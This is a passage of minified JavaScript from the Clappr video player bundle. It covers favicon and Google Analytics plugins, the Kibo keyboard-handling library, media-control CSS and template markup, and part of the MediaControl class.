e(){this.core.options.changeFavicon?this.enabled||(this.stopListening(this.core,k.CORE_OPTIONS_CHANGE),this.enable()):this.enabled&&(this.disable(),this.listenTo(this.core,k.CORE_OPTIONS_CHANGE,this.configure))}},{key:"bindEvents",value:function e(){this.listenTo(this.core,k.CORE_OPTIONS_CHANGE,this.configure),this.listenTo(this.core,k.CORE_ACTIVE_CONTAINER_CHANGED,this.containerChanged),this.core.activeContainer&&this.containerChanged()}},{key:"containerChanged",value:function e(){this._container&&this.stopListening(this._container),this._container=this.core.activeContainer,this.listenTo(this._container,k.CONTAINER_PLAY,this.setPlayIcon),this.listenTo(this._container,k.CONTAINER_PAUSE,this.setPauseIcon),this.listenTo(this._container,k.CONTAINER_STOP,this.resetIcon),this.listenTo(this._container,k.CONTAINER_ENDED,this.resetIcon),this.listenTo(this._container,k.CONTAINER_ERROR,this.resetIcon),this.resetIcon()}},{key:"disable",value:function e(){on(en(n.prototype),"disable",this).call(this),this.resetIcon()}},{key:"destroy",value:function e(){on(en(n.prototype),"destroy",this).call(this),this.resetIcon()}},{key:"createIcon",value:function e(t){var r=y("<canvas/>");r[0].width=16,r[0].height=16;var n=r[0].getContext("2d");n.fillStyle="#000";var i=y(t).find("path").attr("d"),a=new Path2D(i);n.fill(a);var s=y('<link rel="shortcut icon" type="image/png"/>');return s.attr("href",r[0].toDataURL("image/png")),s}},{key:"setPlayIcon",value:function e(){this.playIcon||(this.playIcon=this.createIcon(kn)),this.changeIcon(this.playIcon)}},{key:"setPauseIcon",value:function e(){this.pauseIcon||(this.pauseIcon=this.createIcon(_n)),this.changeIcon(this.pauseIcon)}},{key:"resetIcon",value:function e(){y('link[rel="shortcut icon"]').remove(),y("head").append(this.oldIcon)}},{key:"changeIcon",value:function e(t){t&&(y('link[rel="shortcut icon"]').remove(),y("head").append(t))}}]),n}(l),Cn=function(e){L(n,e);var r=I(n);function n(e){var t;return w(this,n),(t=r.call(this,e)).container.options.gaAccount&&(t.account=t.container.options.gaAccount,t.trackerName=t.container.options.gaTrackerName?t.container.options.gaTrackerName+".":"Clappr.",t.domainName=t.container.options.gaDomainName,t.currentHDState=void 0,t.embedScript()),t}return O(n,[{key:"name",get:function e(){return"google_analytics"}},{key:"supportedVersion",get:function e(){return{min:"0.4.18"}}},{key:"embedScript",value:function e(){var t=this;if(window._gat)this.addEventListeners();else{var r=document.createElement("script");r.setAttribute("type","text/javascript"),r.setAttribute("async","async"),r.setAttribute("src","//www.google-analytics.com/ga.js"),r.onload=function(){return t.addEventListeners()},document.body.appendChild(r)}}},{key:"addEventListeners",value:function e(){var t=this;this.container&&(this.listenTo(this.container,k.CONTAINER_READY,this.onReady),this.listenTo(this.container,k.CONTAINER_PLAY,this.onPlay),this.listenTo(this.container,k.CONTAINER_STOP,this.onStop),this.listenTo(this.container,k.CONTAINER_PAUSE,this.onPause),this.listenTo(this.container,k.CONTAINER_ENDED,this.onEnded),this.listenTo(this.container,k.CONTAINER_STATE_BUFFERING,this.onBuffering),this.listenTo(this.container,k.CONTAINER_STATE_BUFFERFULL,this.onBufferFull),this.listenTo(this.container,k.CONTAINER_ERROR,this.onError),this.listenTo(this.container,k.CONTAINER_PLAYBACKSTATE,this.onPlaybackChanged),this.listenTo(this.container,k.CONTAINER_VOLUME,(function(e){return t.onVolumeChanged(e)})),this.listenTo(this.container,k.CONTAINER_SEEK,(function(e){return t.onSeek(e)})),this.listenTo(this.container,k.CONTAINER_FULL_SCREEN,this.onFullscreen),this.listenTo(this.container,k.CONTAINER_HIGHDEFINITIONUPDATE,this.onHD),this.listenTo(this.container,k.CONTAINER_PLAYBACKDVRSTATECHANGED,this.onDVR)),_gaq.push([this.trackerName+"_setAccount",this.account]),this.domainName&&_gaq.push([this.trackerName+"_setDomainName",this.domainName])}},{key:"onReady",value:function e(){this.push(["Video","Playback",this.container.playback.name])}},{key:"onPlay",value:function e(){this.push(["Video","Play",this.container.playback.src])}},{key:"onStop",value:function e(){this.push(["Video","Stop",this.container.playback.src])}},{key:"onEnded",value:function e(){this.push(["Video","Ended",this.container.playback.src])}},{key:"onBuffering",value:function e(){this.push(["Video","Buffering",this.container.playback.src])}},{key:"onBufferFull",value:function e(){this.push(["Video","Bufferfull",this.container.playback.src])}},{key:"onError",value:function e(){this.push(["Video","Error",this.container.playback.src])}},{key:"onHD",value:function e(t){var r=t?"ON":"OFF";r!==this.currentHDState&&(this.currentHDState=r,this.push(["Video","HD - "+r,this.container.playback.src]))}},{key:"onPlaybackChanged",value:function e(t){null!==t.type&&this.push(["Video","Playback Type - "+t.type,this.container.playback.src])}},{key:"onDVR",value:function e(t){var r=t?"ON":"OFF";this.push(["Interaction","DVR - "+r,this.container.playback.src])}},{key:"onPause",value:function e(){this.push(["Video","Pause",this.container.playback.src])}},{key:"onSeek",value:function e(){this.push(["Video","Seek",this.container.playback.src])}},{key:"onVolumeChanged",value:function e(){this.push(["Interaction","Volume",this.container.playback.src])}},{key:"onFullscreen",value:function e(){this.push(["Interaction","Fullscreen",this.container.playback.src])}},{key:"push",value:function e(t){var r=[this.trackerName+"_trackEvent"].concat(t);_gaq.push(r)}}]),n}(a),D=function e(t){this.element=t||window.document,this.initialize()};for(Rn in D.KEY_NAMES_BY_CODE={8:"backspace",9:"tab",13:"enter",16:"shift",17:"ctrl",18:"alt",20:"caps_lock",27:"esc",32:"space",37:"left",38:"up",39:"right",40:"down",48:"0",49:"1",50:"2",51:"3",52:"4",53:"5",54:"6",55:"7",56:"8",57:"9",65:"a",66:"b",67:"c",68:"d",69:"e",70:"f",71:"g",72:"h",73:"i",74:"j",75:"k",76:"l",77:"m",78:"n",79:"o",80:"p",81:"q",82:"r",83:"s",84:"t",85:"u",86:"v",87:"w",88:"x",89:"y",90:"z",112:"f1",113:"f2",114:"f3",115:"f4",116:"f5",117:"f6",118:"f7",119:"f8",120:"f9",121:"f10",122:"f11",123:"f12"},D.KEY_CODES_BY_NAME={},D.KEY_NAMES_BY_CODE)Object.prototype.hasOwnProperty.call(D.KEY_NAMES_BY_CODE,Rn)&&(D.KEY_CODES_BY_NAME[D.KEY_NAMES_BY_CODE[Rn]]=+Rn);D.MODIFIERS=["shift","ctrl","alt"],D.registerEvent=document.addEventListener?function(e,t,r){e.addEventListener(t,r,!1)}:document.attachEvent?function(e,t,r){e.attachEvent("on"+t,r)}:void 0,D.unregisterEvent=document.removeEventListener?function(e,t,r){e.removeEventListener(t,r,!1)}:document.detachEvent?function(e,t,r){e.detachEvent("on"+t,r)}:void 0,D.stringContains=function(e,t){return-1!==e.indexOf(t)},D.neatString=function(e){return e.replace(/^\s+|\s+$/g,"").replace(/\s+/g," ")},D.capitalize=function(e){return e.toLowerCase().replace(/^./,(function(e){return e.toUpperCase()}))},D.isString=function(e){return D.stringContains(Object.prototype.toString.call(e),"String")},D.arrayIncludes=Array.prototype.indexOf?function(e,t){return-1!==e.indexOf(t)}:function(e,t){for(var r=0;r<e.length;r++)if(e[r]===t)return!0;return!1},D.extractModifiers=function(e){var t,r;for(t=[],r=0;r<D.MODIFIERS.length;r++)D.stringContains(e,D.MODIFIERS[r])&&t.push(D.MODIFIERS[r]);return t},D.extractKey=function(e){var t,r;for(t=D.neatString(e).split(" "),r=0;r<t.length;r++)if(!D.arrayIncludes(D.MODIFIERS,t[r]))return t[r]},D.modifiersAndKey=function(e){var t,r;return D.stringContains(e,"any")?D.neatString(e).split(" ").slice(0,2).join(" "):(t=D.extractModifiers(e),(r=D.extractKey(e))&&!D.arrayIncludes(D.MODIFIERS,r)&&t.push(r),t.join(" "))},D.keyName=function(e){return D.KEY_NAMES_BY_CODE[e+""]},D.keyCode=function(e){return+D.KEY_CODES_BY_NAME[e]},D.prototype.initialize=function(){var e,t=this;for(this.lastKeyCode=-1,this.lastModifiers={},e=0;e<D.MODIFIERS.length;e++)this.lastModifiers[D.MODIFIERS[e]]=!1;this.keysDown={any:[]},this.keysUp={any:[]},this.downHandler=this.handler("down"),this.upHandler=this.handler("up"),D.registerEvent(this.element,"keydown",this.downHandler),D.registerEvent(this.element,"keyup",this.upHandler),D.registerEvent(window,"unload",(function e(){D.unregisterEvent(t.element,"keydown",t.downHandler),D.unregisterEvent(t.element,"keyup",t.upHandler),D.unregisterEvent(window,"unload",e)}))},D.prototype.handler=function(i){var a=this;return function(e){var t,r,n;for(e=e||window.event,a.lastKeyCode=e.keyCode,t=0;t<D.MODIFIERS.length;t++)a.lastModifiers[D.MODIFIERS[t]]=e[D.MODIFIERS[t]+"Key"];for(D.arrayIncludes(D.MODIFIERS,D.keyName(a.lastKeyCode))&&(a.lastModifiers[D.keyName(a.lastKeyCode)]=!0),r=a["keys"+D.capitalize(i)],t=0;t<r.any.length;t++)!1===r.any[t](e)&&e.preventDefault&&e.preventDefault();if(r[n=a.lastModifiersAndKey()])for(t=0;t<r[n].length;t++)!1===r[n][t](e)&&e.preventDefault&&e.preventDefault()}},D.prototype.registerKeys=function(e,t,r){var n,i,a=this["keys"+D.capitalize(e)];for(D.isString(t)&&(t=[t]),n=0;n<t.length;n++)i=t[n],a[i=D.modifiersAndKey(i+"")]?a[i].push(r):a[i]=[r];return this},D.prototype.unregisterKeys=function(e,t,r){var n,i,a,s=this["keys"+D.capitalize(e)];for(D.isString(t)&&(t=[t]),n=0;n<t.length;n++)if(a=t[n],a=D.modifiersAndKey(a+""),null===r)delete s[a];else if(s[a])for(i=0;i<s[a].length;i++)if(String(s[a][i])===String(r)){s[a].splice(i,1);break}return this},D.prototype.off=function(e){return this.unregisterKeys("down",e,null)},D.prototype.delegate=function(e,t,r){return null!==r||void 0!==r?this.registerKeys(e,t,r):this.unregisterKeys(e,t,r)},D.prototype.down=function(e,t){return this.delegate("down",e,t)},D.prototype.up=function(e,t){return this.delegate("up",e,t)},D.prototype.lastKey=function(e){return e?this.lastModifiers[e]:D.keyName(this.lastKeyCode)},D.prototype.lastModifiersAndKey=function(){var e,t;for(e=[],t=0;t<D.MODIFIERS.length;t++)this.lastKey(D.MODIFIERS[t])&&e.push(D.MODIFIERS[t]);return D.arrayIncludes(e,this.lastKey())||e.push(this.lastKey()),e.join(" ")};var wn={Kibo:D},Ln=(dn('.media-control-notransition {\n  transition: none !important; }\n\n.media-control[data-media-control] {\n  position: absolute;\n  width: 100%;\n  height: 100%;\n  z-index: 9999;\n  pointer-events: none; }\n  .media-control[data-media-control].dragging {\n    pointer-events: auto;\n    cursor: -webkit-grabbing !important;\n    cursor: grabbing !important;\n    cursor: url("closed-hand.cur"), move; }\n    .media-control[data-media-control].dragging * {\n      cursor: -webkit-grabbing !important;\n      cursor: grabbing !important;\n      cursor: url("closed-hand.cur"), move; }\n  .media-control[data-media-control] .media-control-background[data-background] {\n    position: absolute;\n    height: 40%;\n    width: 100%;\n    bottom: 0;\n    background: linear-gradient(transparent, rgba(0, 0, 0, 0.9));\n    will-change: transform, opacity;\n    transition: opacity 0.6s ease-out; }\n  .media-control[data-media-control] .media-control-icon {\n    line-height: 0;\n    letter-spacing: 0;\n    speak: none;\n    color: #fff;\n    opacity: 0.5;\n    vertical-align: middle;\n    text-align: left;\n    transition: all 0.1s ease; }\n  .media-control[data-media-control] .media-control-icon:hover {\n    color: white;\n    opacity: 0.75;\n    text-shadow: rgba(255, 255, 255, 0.8) 0 0 5px; }\n  .media-control[data-media-control].media-control-hide .media-control-background[data-background] {\n    opacity: 0; }\n  .media-control[data-media-control].media-control-hide .media-control-layer[data-controls] {\n    transform: translateY(50px); }\n    .media-control[data-media-control].media-control-hide .media-control-layer[data-controls] .bar-container[data-seekbar] .bar-scrubber[data-seekbar] {\n      opacity: 0; }\n  .media-control[data-media-control] .media-control-layer[data-controls] {\n    position: absolute;\n    transform: translateY(-7px);\n    bottom: 0;\n    width: 100%;\n    height: 32px;\n    font-size: 0;\n    vertical-align: middle;\n    pointer-events: auto;\n    transition: bottom 0.4s ease-out; }\n    .media-control[data-media-control] .media-control-layer[data-controls] .media-control-left-panel[data-media-control] {\n      position: absolute;\n      top: 0;\n      left: 4px;\n      height: 100%; }\n    .media-control[data-media-control] .media-control-layer[data-controls] .media-control-center-panel[data-media-control] {\n      height: 100%;\n      text-align: center;\n      line-height: 32px; }\n    .media-control[data-media-control] .media-control-layer[data-controls] .media-control-right-panel[data-media-control] {\n      position: absolute;\n      top: 0;\n      right: 4px;\n      height: 100%; }\n    .media-control[data-media-control] .media-control-layer[data-controls] button.media-control-button {\n      background-color: transparent;\n      border: 0;\n      margin: 0 6px;\n      padding: 0;\n      cursor: pointer;\n      display: inline-block;\n      width: 32px;\n      height: 100%; }\n      .media-control[data-media-control] .media-control-layer[data-controls] button.media-control-button svg {\n        width: 100%;\n        height: 22px; }\n        .media-control[data-media-control] .media-control-layer[data-controls] button.media-control-button svg path {\n          fill: white; }\n      .media-control[data-media-control] .media-control-layer[data-controls] button.media-control-button:focus {\n        outline: none; }\n      .media-control[data-media-control] .media-control-layer[data-controls] button.media-control-button[data-play] {\n        float: left;\n        height: 100%; }\n      .media-control[data-media-control] .media-control-layer[data-controls] button.media-control-button[data-pause] {\n        float: left;\n        height: 100%; }\n      .media-control[data-media-control] .media-control-layer[data-controls] button.media-control-button[data-stop] {\n        float: left;\n        height: 100%; }\n      .media-control[data-media-control] .media-control-layer[data-controls] button.media-control-button[data-fullscreen] {\n        float: right;\n        background-color: transparent;\n        border: 0;\n        height: 100%; }\n      .media-control[data-media-control] .media-control-layer[data-controls] button.media-control-button[data-hd-indicator] {\n        background-color: transparent;\n        border: 0;\n        cursor: default;\n        display: none;\n        float: right;\n        height: 100%; }\n        .media-control[data-media-control] .media-control-layer[data-controls] button.media-control-button[data-hd-indicator].enabled {\n          display: block;\n          opacity: 1.0; }\n          .media-control[data-media-control] .media-control-layer[data-controls] button.media-control-button[data-hd-indicator].enabled:hover {\n            opacity: 1.0;\n            text-shadow: none; }\n      .media-control[data-media-control] .media-control-layer[data-controls] button.media-control-button[data-playpause] {\n        float: left; }\n      .media-control[data-media-control] .media-control-layer[data-controls] button.media-control-button[data-playstop] {\n        float: left; }\n    .media-control[data-media-control] .media-control-layer[data-controls] .media-control-indicator[data-position], .media-control[data-media-control] .media-control-layer[data-controls] .media-control-indicator[data-duration] {\n      display: inline-block;\n      font-size: 10px;\n      color: white;\n      cursor: default;\n      line-height: 32px;\n      position: relative; }\n    .media-control[data-media-control] .media-control-layer[data-controls] .media-control-indicator[data-position] {\n      margin: 0 6px 0 7px; }\n    .media-control[data-media-control] .media-control-layer[data-controls] .media-control-indicator[data-duration] {\n      color: rgba(255, 255, 255, 0.5);\n      margin-right: 6px; }\n      .media-control[data-media-control] .media-control-layer[data-controls] .media-control-indicator[data-duration]:before {\n        content: "|";\n        margin-right: 7px; }\n    .media-control[data-media-control] .media-control-layer[data-controls] .bar-container[data-seekbar] {\n      position: absolute;\n      top: -20px;\n      left: 0;\n      display: inline-block;\n      vertical-align: middle;\n      width: 100%;\n      height: 25px;\n      cursor: pointer; }\n      .media-control[data-media-control] .media-control-layer[data-controls] .bar-container[data-seekbar] .bar-background[data-seekbar] {\n        width: 100%;\n        height: 1px;\n        position: relative;\n        top: 12px;\n        background-color: #666666; }\n        .media-control[data-media-control] .media-control-layer[data-controls] .bar-container[data-seekbar] .bar-background[data-seekbar] .bar-fill-1[data-seekbar] {\n          position: absolute;\n          top: 0;\n          left: 0;\n          width: 0;\n          height: 100%;\n          background-color: #c2c2c2;\n          transition: all 0.1s ease-out; }\n        .media-control[data-media-control] .media-control-layer[data-controls] .bar-container[data-seekbar] .bar-background[data-seekbar] .bar-fill-2[data-seekbar] {\n          position: absolute;\n          top: 0;\n          left: 0;\n          width: 0;\n          height: 100%;\n          background-color: #005aff;\n          transition: all 0.1s ease-out; }\n        .media-control[data-media-control] .media-control-layer[data-controls] .bar-container[data-seekbar] .bar-background[data-seekbar] .bar-hover[data-seekbar] {\n          opacity: 0;\n          position: absolute;\n          top: -3px;\n          width: 5px;\n          height: 7px;\n          background-color: rgba(255, 255, 255, 0.5);\n          transition: opacity 0.1s ease; }\n      .media-control[data-media-control] .media-control-layer[data-controls] .bar-container[data-seekbar]:hover .bar-background[data-seekbar] .bar-hover[data-seekbar] {\n        opacity: 1; }\n      .media-control[data-media-control] .media-control-layer[data-controls] .bar-container[data-seekbar].seek-disabled {\n        cursor: default; }\n        .media-control[data-media-control] .media-control-layer[data-controls] .bar-container[data-seekbar].seek-disabled:hover .bar-background[data-seekbar] .bar-hover[data-seekbar] {\n          opacity: 0; }\n      .media-control[data-media-control] .media-control-layer[data-controls] .bar-container[data-seekbar] .bar-scrubber[data-seekbar] {\n        position: absolute;\n        transform: translateX(-50%);\n        top: 2px;\n        left: 0;\n        width: 20px;\n        height: 20px;\n        opacity: 1;\n        transition: all 0.1s ease-out; }\n        .media-control[data-media-control] .media-control-layer[data-controls] .bar-container[data-seekbar] .bar-scrubber[data-seekbar] .bar-scrubber-icon[data-seekbar] {\n          position: absolute;\n          left: 6px;\n          top: 6px;\n          width: 8px;\n          height: 8px;\n          border-radius: 10px;\n          box-shadow: 0 0 0 6px rgba(255, 255, 255, 0.2);\n          background-color: white; }\n    .media-control[data-media-control] .media-control-layer[data-controls] .drawer-container[data-volume] {\n      float: right;\n      display: inline-block;\n      height: 32px;\n      cursor: pointer;\n      margin: 0 6px;\n      box-sizing: border-box; }\n      .media-control[data-media-control] .media-control-layer[data-controls] .drawer-container[data-volume] .drawer-icon-container[data-volume] {\n        float: left;\n        bottom: 0; }\n        .media-control[data-media-control] .media-control-layer[data-controls] .drawer-container[data-volume] .drawer-icon-container[data-volume] .drawer-icon[data-volume] {\n          background-color: transparent;\n          border: 0;\n          box-sizing: content-box;\n          width: 32px;\n          height: 32px;\n          opacity: 0.5; }\n          .media-control[data-media-control] .media-control-layer[data-controls] .drawer-container[data-volume] .drawer-icon-container[data-volume] .drawer-icon[data-volume]:hover {\n            opacity: 0.75; }\n          .media-control[data-media-control] .media-control-layer[data-controls] .drawer-container[data-volume] .drawer-icon-container[data-volume] .drawer-icon[data-volume] svg {\n            height: 24px;\n            position: relative;\n            top: 3px; }\n            .media-control[data-media-control] .media-control-layer[data-controls] .drawer-container[data-volume] .drawer-icon-container[data-volume] .drawer-icon[data-volume] svg path {\n              fill: white; }\n          .media-control[data-media-control] .media-control-layer[data-controls] .drawer-container[data-volume] .drawer-icon-container[data-volume] .drawer-icon[data-volume].muted svg {\n            margin-left: 2px; }\n      .media-control[data-media-control] .media-control-layer[data-controls] .drawer-container[data-volume] .bar-container[data-volume] {\n        float: left;\n        position: relative;\n        overflow: hidden;\n        top: 6px;\n        width: 42px;\n        height: 18px;\n        padding: 3px 0;\n        transition: width .2s ease-out; }\n        .media-control[data-media-control] .media-control-layer[data-controls] .drawer-container[data-volume] .bar-container[data-volume] .bar-background[data-volume] {\n          height: 1px;\n          position: relative;\n          top: 7px;\n          margin: 0 3px;\n          background-color: #666666; }\n          .media-control[data-media-control] .media-control-layer[data-controls] .drawer-container[data-volume] .bar-container[data-volume] .bar-background[data-volume] .bar-fill-1[data-volume] {\n            position: absolute;\n            top: 0;\n            left: 0;\n            width: 0;\n            height: 100%;\n            background-color: #c2c2c2;\n            transition: all 0.1s ease-out; }\n          .media-control[data-media-control] .media-control-layer[data-controls] .drawer-container[data-volume] .bar-container[data-volume] .bar-background[data-volume] .bar-fill-2[data-volume] {\n            position: absolute;\n            top: 0;\n            left: 0;\n            width: 0;\n            height: 100%;\n            background-color: #005aff;\n            transition: all 0.1s ease-out; }\n          .media-control[data-media-control] .media-control-layer[data-controls] .drawer-container[data-volume] .bar-container[data-volume] .bar-background[data-volume] .bar-hover[data-volume] {\n            opacity: 0;\n            position: absolute;\n            top: -3px;\n            width: 5px;\n            height: 7px;\n            background-color: rgba(255, 255, 255, 0.5);\n            transition: opacity 0.1s ease; }\n        .media-control[data-media-control] .media-control-layer[data-controls] .drawer-container[data-volume] .bar-container[data-volume] .bar-scrubber[data-volume] {\n          position: absolute;\n          transform: translateX(-50%);\n          top: 0px;\n          left: 0;\n          width: 20px;\n          height: 20px;\n          opacity: 1;\n          transition: all 0.1s ease-out; }\n          .media-control[data-media-control] .media-control-layer[data-controls] .drawer-container[data-volume] .bar-container[data-volume] .bar-scrubber[data-volume] .bar-scrubber-icon[data-volume] {\n            position: absolute;\n            left: 6px;\n            top: 6px;\n            width: 8px;\n            height: 8px;\n            border-radius: 10px;\n            box-shadow: 0 0 0 6px rgba(255, 255, 255, 0.2);\n            background-color: white; }\n        .media-control[data-media-control] .media-control-layer[data-controls] .drawer-container[data-volume] .bar-container[data-volume] .segmented-bar-element[data-volume] {\n          float: left;\n          width: 4px;\n          padding-left: 2px;\n          height: 12px;\n          opacity: 0.5;\n          box-shadow: inset 2px 0 0 white;\n          transition: transform .2s ease-out; }\n          .media-control[data-media-control] .media-control-layer[data-controls] .drawer-container[data-volume] .bar-container[data-volume] .segmented-bar-element[data-volume].fill {\n            box-shadow: inset 2px 0 0 #fff;\n            opacity: 1; }\n          .media-control[data-media-control] .media-control-layer[data-controls] .drawer-container[data-volume] .bar-container[data-volume] .segmented-bar-element[data-volume]:nth-of-type(1) {\n            padding-left: 0; }\n          .media-control[data-media-control] .media-control-layer[data-controls] .drawer-container[data-volume] .bar-container[data-volume] .segmented-bar-element[data-volume]:hover {\n            transform: scaleY(1.5); }\n  .media-control[data-media-control].w320 .media-control-layer[data-controls] .drawer-container[data-volume] .bar-container[data-volume].volume-bar-hide {\n    width: 0;\n    height: 12px;\n    top: 9px;\n    padding: 0; }\n'),'<div class="media-control-background" data-background></div>\n<div class="media-control-layer" data-controls>\n  <%  var renderBar = function(name) { %>\n      <div class="bar-container" data-<%= name %>>\n        <div class="bar-background" data-<%= name %>>\n          <div class="bar-fill-1" data-<%= name %>></div>\n          <div class="bar-fill-2" data-<%= name %>></div>\n          <div class="bar-hover" data-<%= name %>></div>\n        </div>\n        <div class="bar-scrubber" data-<%= name %>>\n          <div class="bar-scrubber-icon" data-<%= name %>></div>\n        </div>\n      </div>\n  <%  }; %>\n  <%  var renderSegmentedBar = function(name, segments) {\n      segments = segments || 10; %>\n    <div class="bar-container" data-<%= name %>>\n    <% for (var i = 0; i < segments; i++) { %>\n      <div class="segmented-bar-element" data-<%= name %>></div>\n    <% } %>\n    </div>\n  <% }; %>\n  <% var renderDrawer = function(name, renderContent) { %>\n      <div class="drawer-container" data-<%= name %>>\n        <div class="drawer-icon-container" data-<%= name %>>\n          <div class="drawer-icon media-control-icon" data-<%= name %>></div>\n          <span class="drawer-text" data-<%= name %>></span>\n        </div>\n        <% renderContent(name); %>\n      </div>\n  <% }; %>\n  <% var renderIndicator = function(name) { %>\n      <div class="media-control-indicator" data-<%= name %>></div>\n  <% }; %>\n  <% var renderButton = function(name) { %>\n    <button type="button" class="media-control-button media-control-icon" data-<%= name %> aria-label="<%= name %>"></button>\n  <% }; %>\n  <%  var templates = {\n        bar: renderBar,\n        segmentedBar: renderSegmentedBar,\n      };\n      var render = function(settingsList) {\n        settingsList.forEach(function(setting) {\n          if(setting === "seekbar") {\n            renderBar(setting);\n          } else if (setting === "volume") {\n            renderDrawer(setting, settings.volumeBarTemplate ? templates[settings.volumeBarTemplate] : function(name) { return renderSegmentedBar(name); });\n          } else if (setting === "duration" || setting === "position") {\n            renderIndicator(setting);\n          } else {\n            renderButton(setting);\n          }\n        });\n      }; %>\n  <% if (settings.default && settings.default.length) { %>\n  <div class="media-control-center-panel" data-media-control>\n    <% render(settings.default); %>\n  </div>\n  <% } %>\n  <% if (settings.left && settings.left.length) { %>\n  <div class="media-control-left-panel" data-media-control>\n    <% render(settings.left); %>\n  </div>\n  <% } %>\n  <% if (settings.right && settings.right.length) { %>\n  <div class="media-control-right-panel" data-media-control>\n    <% render(settings.right); %>\n  </div>\n  <% } %>\n</div>\n'),In='<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 16 16">\n  <path fill-rule="evenodd" clip-rule="evenodd" fill="#010101" d="M1.712 1.24h12.6v13.52h-12.6z"/>\n</svg>',Dn='<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 16 16">\n  <path fill-rule="evenodd" clip-rule="evenodd" fill="#010101" d="M11.5 11h-.002v1.502L7.798 10H4.5V6h3.297l3.7-2.502V4.5h.003V11zM11 4.49L7.953 6.5H5v3h2.953L11 11.51V4.49z"/>\n</svg>',Nn='<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 16 16">\n  <path fill="#010101" d="M7.156 8L4 11.156V8.5H3V13h4.5v-1H4.844L8 8.844 7.156 8zM8.5 3v1h2.657L8 7.157 8.846 8 12 4.844V7.5h1V3H8.5z"/>\n</svg>',Fn=t.Config,Bn=t.Fullscreen,Un=t.formatTime,jn=t.extend,Vn=t.removeArrayItem,Gn=function(e){L(n,e);var r=I(n);function n(e){var t;return w(this,n),(t=r.call(this,e)).persistConfig=t.options.persistConfig,t.currentPositionValue=null,t.currentDurationValue=null,t.keepVisible=!1,t.fullScreenOnVideoTagSupported=null,t.setInitialVolume(),t.settings={left:["play","stop","pause"],right:["volume"],default:["position","seekbar","duration"]},t.kibo=new D(t.options.focusElement),t.bindKeyEvents(),t.container?y.isEmptyObject(t.container.settings)||(t.settings=y.extend({},t.container.settings)):t.settings={},t.userDisabled=!1,(t.container&&t.container.mediaControlDisabled||t.options.chromeless)&&t.disable(),t.stopDragHandler=function(e){return t.stopDrag(e)},t.updateDragHandler=function(e){return t.updateDrag(e)},y(document).bind("mouseup",t.stopDragHandler),y(document).bind("mousemove",t.updateDragHandler),t}return O(n,[{key:"name",get:function e(){return"media_control"}},{key:"supportedVersion",get:function e(){return{min:"0.4.18"}}},{key:"disabled",get:function e(){var t=this.container&&this.container.getPlaybackType()===S.NO_OP;return this.userDisabled||t}},{key:"container",get:function e(){return this.core&&this.core.activeContainer}},{key:"playback",get:function e(){return this.core&&this.core.activePlayback}},{key:"attributes",get:function e(){return{class:"media-control","data-media-control":""}}},{key:"events",get:function e(){return{"click [data-play]":"play","click [data-pause]":"pause","click [data-playpause]":"togglePlayPause","click [data-stop]":"stop","click [data-playstop]":"togglePlayStop","click [data-fullscreen]":"toggleFullscreen","click .bar-container[data-seekbar]":"seek","click .bar-container[data-volume]":"onVolumeClick","click .drawer-icon[data-volume]":"toggleMute","mouseenter .drawer-container[data-volume]":"showVolumeBar","mouseleave .drawer-container[data-volume]":"hideVolumeBar","mousedown .bar-container[data-volume]":"startVolumeDrag","mousemove .bar-container[data-volume]":"mousemoveOnVolumeBar","mousedown .bar-scrubber[data-seekbar]":"startSeekDrag","mousemove .bar-container[data-seekbar]":"mousemoveOnSeekBar","mouseleave .bar-container[data-seekbar]":"mouseleaveOnSeekBar","mouseenter .media-control-layer[data-controls]":"setUserKeepVisible","mouseleave .media-control-layer[data-controls]":"resetUserKeepVisible"}}},{key:"template",get:function e(){return _(Ln)}},{key:"volume",get:function e(){return this.container&&this.container.isReady?this.container.volume:this.intendedVolume}},{key:"muted",get:function e(){return 0===this.volume}},{key:"getExternalInterface",value:function e(){var t=this;return{setVolume:this.setVolume,getVolume:function e(){return t.volume}}}},{key:"bindEvents",value:function e(){var t=this;this.stopListening(),this.listenTo(this.core,k.CORE_ACTIVE_CONTAINER_CHANGED,this.onActiveContainerChanged),this.listenTo(this.core,k.CORE_MOUSE_MOVE,this.show),this.listenTo(this.core,k.CORE_MOUSE_LEAVE,(function(){return t.hide(t.options.hideMediaControlDelay)})),this.listenTo(this.core,k.CORE_FULLSCREEN,this.show),this.listenTo(this.core,k.CORE_OPTIONS_CHANGE,this.configure),this.listenTo(this.core,k.CORE_RESIZE,this.playerResize),this.bindContainerEvents()}},{key:"bindContainerEvents",value:function e(){this.container&&(this.listenTo(this.container,k.CONTAINER_PLAY,this.changeTogglePlay),this.listenTo(this.container,k.CONTAINER_PAUSE,this.changeTogglePlay),this.listenTo(this.container,k.CONTAINER_STOP,this.changeTogglePlay),this.listenTo(this.container,k.CONTAINER_DBLCLICK,this.toggleFullscreen),this.listenTo(this.container,k.CONTAINER_TIMEUPDATE,this.onTimeUpdate),this.listenTo(this.container,k.CONTAINER_PROGRESS,this.updateProgressBar),this.listenTo(this.container,k.CONTAINER_SETTINGSUPDATE,this.settingsUpdate),this.listenTo(this.container,k.CONTAINER_PLAYBACKDVRSTATECHANGED,this.settingsUpdate),this.listenTo(this.container,k.CONTAINER_HIGHDEFINITIONUPDATE,this.highDefinitionUpdate),this.listenTo(this.container,k.CONTAINER_MEDIACONTROL_DISABLE,this.disable),this.listenTo(this.container,k.CONTAINER_MEDIACONTROL_ENABLE,this.enable),this.listenTo(this.container,k.CONTAINER_ENDED,this.ended),this.listenTo(this.container,k.CONTAINER_VOLUME,this.onVolumeChanged),this.listenTo(this.container,k.CONTAINER_OPTIONS_CHANGE,this.setInitialVolume),"video"===this.container.playback.el.nodeName.toLowerCase()&&this.listenToOnce(this.container,k.CONTAINER_LOADEDMETADATA,this.onLoadedMetadataOnVideoTag))}},{key:"disable",value:function e(){this.userDisabled=!0,this.hide(),this.unbindKeyEvents(),this.$el.hide()}},{key:"enable",value:function e(){this.options.chromeless||(this.userDisabled=!1,this.bindKeyEvents(),this.show())}},{key:"play",value:function e(){this.container&&this.container.play()}},{key:"pause",value:function e(){this.container&&this.container.pause()}},{key:"stop",value:function e(){this.container&&this.container.stop()}},{key:"setInitialVolume",value:function e(){var t=this.persistConfig?Fn.restore("volume"):100,r=this.container&&this.container.options||this.options;this.setVolume(r.mute?0:t,!0)}},{key:"onVolumeChanged",value:function e(){this.updateVolumeUI()}},{key:"onLoadedMetadataOnVideoTag",value:function e(){var 